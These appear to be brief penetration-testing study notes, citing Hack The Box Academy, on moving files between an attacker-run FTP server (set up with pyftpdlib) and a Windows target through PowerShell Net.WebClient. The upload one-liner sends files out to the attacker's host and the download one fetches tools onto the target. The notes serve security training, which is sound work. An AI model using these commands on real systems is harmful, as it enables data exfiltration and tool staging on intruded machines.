Preparation:

Setting up ftp server on Attacker End:
```
sudo pip3 install pyftpdlib
sudo python3 -m pyftpdlib --port <port> --write #--write allows upload
```

Interacting: 
Downloading File from FTP Server:
```
(New-Object Net.WebClient).DownloadFile('ftp://<ip>/<filename>', '<Path_to_file>')
```

Uploading file from powershell (Require PSUpload.ps1 - https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1)
```
(New-Object Net.WebClient).UploadFile('ftp://<ip>/ftp-hosts', '<fname>')
```

Ref: https://academy.hackthebox.com/app/module/24/section/160 / https://academy.hackthebox.com/app/module/24/section/514